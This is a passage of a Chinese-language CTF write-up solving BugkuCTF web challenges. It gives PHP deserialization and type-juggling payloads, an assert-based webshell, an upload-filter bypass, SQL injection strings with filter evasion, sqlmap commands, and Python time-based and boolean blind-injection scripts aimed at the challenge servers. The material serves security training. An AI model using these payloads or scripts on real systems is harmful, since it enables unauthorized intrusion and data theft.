<span class="keyword">echo</span> <span class="string">"you are not the number of bugku ! "</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>进行代码审计，是一道php反序列化的题:</p>
<ul>
<li><p>首先<code>file</code>不能包含<code>flag</code>，否则就直接退出了，当<code>file</code>不包含<code>flag</code>时，就包含这个文件，并且将<code>password</code>反序列化再输出。</p>
</li>
<li><p>这里看到了反序列化，又想到了刚才的<code>Flag()</code>，显然这里要<code>file=hint.php</code>，将<code>Flag()</code>包含进来。</p>
</li>
<li><p><code>__tostring()</code>函数在直接输出<code>Flag</code>类的对象引用时会被自动调用，并且如果<code>file</code>存在就输出<code>file</code>文件中的内容，显然这里就是我们得到<code>flag.php</code>中内容的途径。</p>
</li>
<li><p>这里看到<code>echo $password;</code>，因此要再<code>password</code>中传入<strong>序列化</strong>过后的<code>Flag</code>类的一个对象，并且它的<code>file</code>属性要为<code>flag.php</code>，这样在<code>Flag</code>类执行<code>__tostring()</code>时就会包含它，可以写如下脚本来得到payload：</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$password = <span class="keyword">new</span> Flag();</span><br><span class="line"><span class="comment">//根据Flag类以及提示，file应该构造为flag.php</span></span><br><span class="line">$password-&gt;file = <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($password);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>得到的运行的结果为：<code>O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></p>
<p>因此最终构造的payload为：<code>?txt=php://input&amp;file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code><img src="/2019/03/07/BugkuCTF-Writeup——Web/20190307213228898.png" alt="?"><br><br></p>
<h4 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h4><p>题目里给出了源码：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">	$poc=<span class="string">"a#s#s#e#r#t"</span>; </span><br><span class="line">	$poc_1=explode(<span class="string">"#"</span>,$poc);  	</span><br><span class="line">	$poc_2=$poc_1[<span class="number">0</span>].$poc_1[<span class="number">1</span>].$poc_1[<span class="number">2</span>].$poc_1[<span class="number">3</span>].$poc_1[<span class="number">4</span>].$poc_1[<span class="number">5</span>]; </span><br><span class="line">	$poc_2($_GET[<span class="string">'s'</span>]) <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>构造payload：<code>?s=print_r(scandir(&#39;./&#39;));</code>扫描目录，读取flag_sm1skla1.txt</p>
<h4 id="字符？正则？"><a href="#字符？正则？" class="headerlink" title="字符？正则？"></a>字符？正则？</h4><p>代码审计：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="string">'2.php'</span>);</span><br><span class="line">$key=<span class="string">'KEY&#123;********************************&#125;'</span>;</span><br><span class="line">$IM= preg_match(<span class="string">"/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i"</span>, trim($_GET[<span class="string">"id"</span>]), $match);</span><br><span class="line"><span class="keyword">if</span>( $IM )&#123; </span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'key is: '</span>.$key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>keykeyxxxxxkey:/x/keya,</span><br></pre></td></tr></table></figure></p>
<p>匹配正则表达式：<br><figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">key<span class="function">  -&gt;</span>  key</span><br><span class="line">.*<span class="function">  -&gt;</span>  .代表通配符，*指匹配<span class="number">0</span>次或多次，所以也可以不进行匹配</span><br><span class="line">key<span class="function">  -&gt;</span>  key</span><br><span class="line">.&#123;<span class="number">4</span>,<span class="number">7</span>&#125;<span class="function">  -&gt;</span>  匹配任意字符<span class="number">4</span>-<span class="number">7</span>次，这里用xxxxx匹配</span><br><span class="line">key:<span class="string">\/.\/</span> <span class="function"> -&gt;</span>  key<span class="regexp">/x/</span></span><br><span class="line"><span class="function"><span class="params">(.*key)</span>  -&gt;</span> key</span><br><span class="line">[a-z]<span class="function">  -&gt;</span> a</span><br><span class="line">[[:punct:]]<span class="function">  -&gt;</span> 指匹配任意标点，这里用,匹配</span><br></pre></td></tr></table></figure></p>
<p>因此最终构造的payload：<code>?id=keykeyxxxxxkey:/x/keya,</code></p>
<p><br></p>
<h4 id="前女友-SKCTF"><a href="#前女友-SKCTF" class="headerlink" title="前女友(SKCTF)"></a>前女友(SKCTF)</h4><p>代码审计：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'v1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v2'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v3'</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">'v1'</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line">    $v3 = $_GET[<span class="string">'v3'</span>];</span><br><span class="line">    <span class="keyword">if</span>($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!strcmp($v3, $flag))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>很常见的一个md5绕过（这里0e开头绕过以及数组绕过都可以），以及<code>strcmp()</code>函数的漏洞，即当传入的参数为数组时，会报错并且<code>return 0</code></p>
<p>可参考这篇文章：<a href="https://www.cnblogs.com/wh4am1/p/6687199.html" target="_blank" rel="noopener">PHP渗透中的奇淫技巧–检查相等时的漏洞</a></p>
<p>最终构造的payload：<code>?v1[]=1&amp;v2[]=2&amp;v3[]=3</code></p>
<p><br></p>
<h4 id="login1-SKCTF"><a href="#login1-SKCTF" class="headerlink" title="login1(SKCTF)"></a>login1(SKCTF)</h4><p>SQL约束攻击，原理可以参考这篇文章：<br><a href="https://www.freebuf.com/articles/web/124537.html" target="_blank" rel="noopener">基于约束的SQL攻击</a></p>
<p>注册，用户名为admin加许多空格再加一个任意字符，如：</p>
<pre><code>admin                                                                                                        123
</code></pre><p>密码可以任意设置<br><img src="/2019/03/07/BugkuCTF-Writeup——Web/20190308202627201.png" alt="在这里插入图片描述"><br>然后再返回登陆页面，使用<code>admin</code>的用户名，和刚才自己设置的密码，即可用<code>admin</code>的账号登陆。<br><img src="/2019/03/07/BugkuCTF-Writeup——Web/20190308202901732.png" alt="在这里插入图片描述"><br><br></p>
<h4 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h4><p>进入页面后看到”are you from google?”，一开始以为是指伪装成谷歌浏览器访问，后来发现是构造http的Refere，如下：<br><img src="/2019/03/07/BugkuCTF-Writeup——Web/20190308204958633.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h4 id="md5-collision-NUPT-CTF"><a href="#md5-collision-NUPT-CTF" class="headerlink" title="md5 collision(NUPT_CTF)"></a>md5 collision(NUPT_CTF)</h4><p>由题目可以知道为MD5碰撞，想到0e开头的md5，因此构造payload：</p>
<pre><code>?a=s878926199a
</code></pre><p><img src="/2019/03/07/BugkuCTF-Writeup——Web/20190308205346629.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h4 id="程序员本地网站"><a href="#程序员本地网站" class="headerlink" title="程序员本地网站"></a>程序员本地网站</h4><p>题目要求从本地访问，因此直接抓包构造：<code>X-Forwarded-For: 127.0.0.1</code><br><img src="/2019/03/07/BugkuCTF-Writeup——Web/20190308205549236.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h4 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h4><p>代码审计：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">$_GET[<span class="string">'id'</span>] = urldecode($_GET[<span class="string">'id'</span>]);</span><br><span class="line">$flag = <span class="string">'flag&#123;xxxxxxxxxxxxxxxxxx&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'uname'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'uname'</span>] == $_POST[<span class="string">'passwd'</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'passwd can not be uname.'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'uname'</span>]) === sha1($_POST[<span class="string">'passwd'</span>])&amp;($_GET[<span class="string">'id'</span>]==<span class="string">'margin'</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'sorry!'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>（1）要求<code>uname</code>和<code>passwd</code>不同，但<code>sha1</code>加密后相等，可以利用数组绕过，这里还要注意<code>uname</code>通过GET传入，而<code>passwd</code>是通过POST传入。<br>（2）要求传入的<code>id=margin</code>，但是再判断前先通过<code>urldecode()</code>进行了解码，因此在传的时候要将<code>margin</code>中的任意字符<code>urlencode</code>后再传入。（这里将<code>m</code>编码为<code>%6D</code>）</p>
<p>最终构造的payload：<code>?uname[]=1&amp;id=%6Dargin</code>  ，post中传入：<code>passwd[]=2</code><br><img src="/2019/03/07/BugkuCTF-Writeup——Web/20190308210639235.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h4 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h4><p>代码审计：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($ac))</span><br><span class="line">&#123;</span><br><span class="line">$f = trim(file_get_contents($fn));</span><br><span class="line"><span class="keyword">if</span> ($ac === $f)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;This is flag:"</span> .<span class="string">" $flag&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;sorry!&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>要传入<code>$ac</code>和<code>$fn</code>两个参数，且包含的文件名即为去除空格后<code>$fn</code>的值，要输出flag，还要满足传入的<code>$ac</code>的值与包含的文件中内容相等，想到利用<code>php://input</code>伪协议。<br><img src="/2019/03/07/BugkuCTF-Writeup——Web/20190308211403691.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h4 id="细心"><a href="#细心" class="headerlink" title="细心"></a>细心</h4><p>访问<code>robots.txt</code>发现有<code>resusl.php</code>页面：<br><img src="/2019/03/07/BugkuCTF-Writeup——Web/20190308211850282.png" alt="在这里插入图片描述"><br>访问该页面，看到页面后面有一个<code>?x=a</code>，又想到题目中的“想办法变成admin”，因此构造payload：<code>?x=admin</code>，得到flag<br><img src="/2019/03/07/BugkuCTF-Writeup——Web/20190308212113963.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h4 id="求getshell"><a href="#求getshell" class="headerlink" title="*求getshell"></a>*求getshell</h4><p>（1）题目要求上传一个图片，不能上传php文件，那么解法肯定就是要成功上传一个php文件。</p>
<p>（2）我上传了一个后缀为.jpg的文件，然后上传的时候抓包。</p>
<p>（3）这里有两个需要绕过的点</p>
<ul>
<li>把请求头里面的<code>Content-Type</code>部分字母改成大写进行绕过 </li>
<li>后缀改为<code>.php5</code>（其他的都被过滤了）<br><img src="/2019/03/07/BugkuCTF-Writeup——Web/20190308213518597.png" alt="在这里插入图片描述"><br><br><h1 id="INSERT-INTO注入"><a href="#INSERT-INTO注入" class="headerlink" title="**INSERT INTO注入"></a>**INSERT INTO注入</h1>题目给出了源码：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span><span class="params">()</span></span>&#123;</span><br><span class="line">$ip = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr = explode(<span class="string">','</span>, $ip);</span><br><span class="line"><span class="keyword">return</span> $ip_arr[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host=<span class="string">"localhost"</span>;</span><br><span class="line">$user=<span class="string">""</span>;</span><br><span class="line">$pass=<span class="string">""</span>;</span><br><span class="line">$db=<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$connect = mysql_connect($host, $user, $pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to connect"</span>);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to select database"</span>);</span><br><span class="line"></span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'your ip is :'</span>.$ip;</span><br><span class="line">$sql=<span class="string">"insert into client_ip (ip) values ('$ip')"</span>;</span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>简单分析得其是读取HTTP头部<code>X-Forwarded-For</code>作为ip地址，在将其传给$ip之前，以 <code>,</code> 为分割符进行分割并取结果数组的第一项。</p>
<p>这里要注入的语句为:</p>
<pre><code>insert into client_ip (ip) values (&apos;$ip&apos;)
</code></pre><p> <strong>在<code>insert into</code>语句里要嵌套执行其他语句时，需要用将字符串与要执行的语句通过<code>+</code>来连接，例：</strong><br><figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">insert</span> <span class="keyword">into</span> admin(id,username,<span class="keyword">password</span>) <span class="keyword">values</span>(<span class="number">1</span>,<span class="number">1</span>,<span class="string">''</span>+(<span class="keyword">select</span> sleep(<span class="number">3</span>)));</span><br><span class="line">Query OK, 1 row affected (3.04 sec)</span><br></pre></td></tr></table></figure></p>
<p>还有这里过滤了逗号，所以要注意以下几点：</p>
<ul>
<li>采取时间盲注时不能用<code>if(cond,expr1,expr2)</code>语句，可以用<code>case...when...then</code>语句代替。</li>
<li>常用的形式截取字符串函数<code>substr([str],[from],[len])</code>由于包含逗号也要用<code>substr([str] from [from] for [len])</code>来代替。</li>
<li>如有需要，可以用<code>limit [len] offset [offset]</code>代替 <code>limit [offset],[len]</code>。</li>
</ul>
<p>综上，最后写出的python脚本如下：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://123.206.87.240:8002/web15/'</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">dic = <span class="string">'0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#123;&#125;_'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="comment">#依次使用下面四个payload即可得到flag</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#爆库名(可以省略，直接用下面三个就可以)</span></span><br><span class="line">        <span class="comment">#payload = f"1'+(case when (substr(database() from &#123;i&#125; for 1)='&#123;j&#125;') then sleep(4) else 1 end))#"</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">#爆表名</span></span><br><span class="line">        <span class="comment">#payload = f"1'+(case when (substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from &#123;i&#125; for 1)='&#123;j&#125;') then sleep(4) else 1 end))#"</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#爆列名</span></span><br><span class="line">        <span class="comment">#payload = f"1'+(case when (substr((select group_concat(column_name) from information_schema.columns where table_name='flag') from &#123;i&#125; for 1)='&#123;j&#125;') then sleep(4) else 1 end))#"</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">#爆字段</span></span><br><span class="line">        payload = <span class="string">f"1'+(case when (substr((select binary group_concat(flag) from flag) from <span class="subst">&#123;i&#125;</span> for 1)='<span class="subst">&#123;j&#125;</span>') then sleep(4) else 1 end))#"</span></span><br><span class="line">        headers = &#123;<span class="string">'x-forwarded-for'</span>:payload&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url,headers=headers,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/03/07/BugkuCTF-Writeup——Web/20190331234800422.png" alt="在这里插入图片描述"><br>因此最后得到flag为：<code>flag{cdbf14c9551d5be5612f7bb5d2867853}</code></p>
<p><br></p>
<h4 id="这是一个神奇的登陆框"><a href="#这是一个神奇的登陆框" class="headerlink" title="*这是一个神奇的登陆框"></a>*这是一个神奇的登陆框</h4><p>这题同样是一道注入题，因为是post注入，所以<strong>先抓包</strong>，这一题既可以手工注入，也可以直接用sqlmap跑。</p>
<h6 id="1-手工注入"><a href="#1-手工注入" class="headerlink" title="1.手工注入"></a>1.手工注入</h6><p>（1）测试发现：<br><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">admin_name=1<span class="string">"&amp;admin_passwd=password&amp;submit=GO+GO+GO       报错</span></span><br><span class="line"><span class="string">admin_name=1"</span><span class="comment">#&amp;admin_passwd=password&amp;submit=GO+GO+GO      Try Again!</span></span><br></pre></td></tr></table></figure></p>
<p><code>1&quot;</code>报错了，而<code>1&quot;#</code>则为<code>Try Again!</code>，判断应该用双引号闭合的。<br><img src="/2019/03/07/BugkuCTF-Writeup——Web/201904010036068.png" alt="在这里插入图片描述"><br>（2）<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="attribute">admin_name</span>=1" order by 3 #&amp;<span class="attribute">admin_passwd</span>=password&amp;submit=GO+GO+GO</span><br><span class="line">到3的时候报错，判断应该有两列</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/03/07/BugkuCTF-Writeup——Web/20190401003933823.png" alt="在这里插入图片描述"><br>（3）<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">-1" union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span><span class="comment">#</span></span><br><span class="line">判断应该用<span class="number">1</span>的位置进行注入</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/03/07/BugkuCTF-Writeup——Web/20190401004238988.png" alt="在这里插入图片描述"><br>（3）暴库名<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">-1" union <span class="keyword">select</span> <span class="keyword">database</span>(),<span class="number">2</span><span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/03/07/BugkuCTF-Writeup——Web/20190401004518874.png" alt="在这里插入图片描述"><br>（4）爆表名<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">-1" union <span class="keyword">select</span> (<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">2</span><span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/03/07/BugkuCTF-Writeup——Web/20190401004837781.png" alt="在这里插入图片描述"><br>（5）爆列名<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">-1" union <span class="keyword">select</span> (<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'flag1'</span>),<span class="number">2</span><span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/03/07/BugkuCTF-Writeup——Web/20190401005032740.png" alt="在这里插入图片描述"><br>（5）爆字段<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">-1" union <span class="keyword">select</span> (<span class="keyword">select</span> <span class="keyword">group_concat</span>(flag1) <span class="keyword">from</span> flag1),<span class="number">2</span><span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/03/07/BugkuCTF-Writeup——Web/20190401005132686.jpg" alt="在这里插入图片描述"></p>
<h6 id="2-sqlmap"><a href="#2-sqlmap" class="headerlink" title="2.sqlmap"></a>2.sqlmap</h6><p>首先将抓包下来的包保存为txt文件（我是直接放在了sqlmap的目录下，下面文件位置应该使用绝对路径），依次执行下列命令即可：<br><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">sqlmap<span class="selector-class">.py</span> -r <span class="string">"2.txt"</span> -<span class="selector-tag">p</span> admin_name --dbs</span><br><span class="line">sqlmap<span class="selector-class">.py</span> -r <span class="string">"2.txt"</span> -<span class="selector-tag">p</span> admin_name -D bugkusql1 --tables</span><br><span class="line">sqlmap<span class="selector-class">.py</span> -r <span class="string">"2.txt"</span> -<span class="selector-tag">p</span> admin_name -D bugkusql1 -T flag1 --<span class="attribute">columns</span></span><br><span class="line">sqlmap<span class="selector-class">.py</span> -r <span class="string">"2.txt"</span> -<span class="selector-tag">p</span> admin_name -D bugkusql1 -T flag1 -C flag1 --dump</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/03/07/BugkuCTF-Writeup——Web/20190401005606230.png" alt="在这里插入图片描述"><br></p>
<h4 id="多次"><a href="#多次" class="headerlink" title="*多次"></a>*多次</h4><p>这一题比较坑，一开始测试了几个数据，发现只有<code>There is nothing.</code>和<code>Error,Error,Error!</code>两种回显，还以为是盲注，但其实不是盲注….<br>（1）第一关<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1			回显There is <span class="literal">nothing</span>.</span><br><span class="line">?<span class="attribute">id</span>=1'			回显Error,Error,Error!</span><br><span class="line">?<span class="attribute">id</span>=1'--+		回显There is <span class="literal">nothing</span>.</span><br><span class="line"></span><br><span class="line">但是：</span><br><span class="line">?<span class="attribute">id</span>=1' <span class="keyword">and</span> <span class="attribute">1</span>=1--+ 回显了Error,Error,Error!，所以应该还过滤了什么</span><br><span class="line">尝试</span><br><span class="line">?<span class="attribute">id</span>=1' anandd <span class="attribute">1</span>=1--+ 回显了There is <span class="literal">nothing</span>.</span><br><span class="line">所以这里应该是用空值替换了SQL某些关键字，可以双写绕过</span><br></pre></td></tr></table></figure></p>
<p>这里可以用<strong>异或注入</strong>来判断过滤了哪些关键词：<br><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">异或：<span class="number">1</span>^<span class="number">1</span>=<span class="number">0</span>，<span class="number">1</span>^<span class="number">0</span>=<span class="number">1</span>，<span class="number">0</span>^<span class="number">1</span>=<span class="number">1</span>，<span class="number">0</span>^<span class="number">0</span>=<span class="number">0</span></span><br><span class="line">这样当构造：?id=<span class="number">1</span>'^(length('and')=<span class="number">0</span>)--+</span><br><span class="line">若返回正确页面的回显(There is nothing.)，则说明(length('and')=<span class="number">0</span>)为假;</span><br><span class="line">若返回错误页面的回显(Error,Error,Error!)，则说明(length('and')=<span class="number">0</span>)为真。</span><br><span class="line"></span><br><span class="line">这里?id=<span class="number">1</span>'^(length('and')=<span class="number">0</span>)--+均回显了Error,Error,Error!，说明(length('and')=<span class="number">0</span>)为真，那么可判断and被过滤了</span><br><span class="line">同理可判断or、select、union也被过滤了</span><br></pre></td></tr></table></figure></p>
<p>下面进行手工注入<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">爆表名</span><br><span class="line">?<span class="attribute">id</span>=-1' uniunionon seleselectct 1,(seleselectct group_concat(table_name) <span class="keyword">from</span> infoorrmation_schema.tables where <span class="attribute">table_schema</span>=database())--+</span><br><span class="line">爆列名</span><br><span class="line">?<span class="attribute">id</span>=-1' uniunionon seleselectct 1,(seleselectct group_concat(column_name) <span class="keyword">from</span> infoorrmation_schema.columns where <span class="attribute">table_name</span>=<span class="string">'flag1'</span>)--+</span><br><span class="line">爆address字段的值</span><br><span class="line">?<span class="attribute">id</span>=-1' uniunionon seleselectct 1,(seleselectct group_concat(address) <span class="keyword">from</span> flag1)--+</span><br></pre></td></tr></table></figure></p>
<p>这样就可以进入下一关。<br><img src="/2019/03/07/BugkuCTF-Writeup——Web/20190401215847432.png" alt="在这里插入图片描述"></p>
<p>（2）第二关<br>发现会回显<code>Hello,I Am Here!</code>和<code>Nobody!</code>，经过异或测试，发现过滤了<code>union</code>和<code>substr</code>，可以用<code>mid()</code>来代替<code>substr()</code>，写的盲注脚本如下：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">'http://123.206.87.240:9004/Once_More.php'</span></span><br><span class="line">payloads = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789,&#123;&#125;_'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#过滤了union和substr</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> payloads:  <span class="comment"># 依次跑下面三个payload</span></span><br><span class="line">        <span class="comment"># 表名</span></span><br><span class="line">        <span class="comment">#payload = f"?id=1' and mid((select binary group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1)='&#123;j&#125;'--+"</span></span><br><span class="line">    </span><br><span class="line">        <span class="comment"># 字段名</span></span><br><span class="line">        <span class="comment">#payload = f"?id=1' and mid((select binary group_concat(column_name) from information_schema.columns where table_name='flag2'),&#123;i&#125;,1)='&#123;j&#125;'--+"</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 字段</span></span><br><span class="line">        payload = <span class="string">f"?id=1' and mid((select binary group_concat(flag2) from flag2),<span class="subst">&#123;i&#125;</span>,1)='<span class="subst">&#123;j&#125;</span>'--+"</span></span><br><span class="line">        <span class="comment"># 这里通过加入binary来区分大小写，因为flag中大小写都可能包含</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Nobody'</span> <span class="keyword">not</span> <span class="keyword">in</span> s.get(url+payload).text:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure></p>
<p>结果：<br><img src="/2019/03/07/BugkuCTF-Writeup——Web/20190406005018309.png" alt="在这里插入图片描述"><br>这里除了盲注，其实还会在页面上显示错误信息，因此也可以利用用<strong>updatexml() 函数报错注入</strong>。</p>
<blockquote>
<p><strong>updatexml()函数</strong><br><br>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br> 第二个参数：XPath_string(Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据  <br><br> <strong>作用</strong>： 改变文档中符合条件的节点的值<br>改变XML_document中符合XPATH_string的值</p>
</blockquote>
<p>例如，<code>updatexml(1,concat(&#39;~&#39;,(select database()),&#39;~&#39;),3);</code><br>由于<code>updatexml()</code>的第二个参数需要Xpath格式的字符串，以<code>~</code>开头的内容不是xml格式的语法，其中的<code>concat()</code>函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，会将括号内的执行结果以错误的形式报出，这样就可以实现报错注入了。</p>
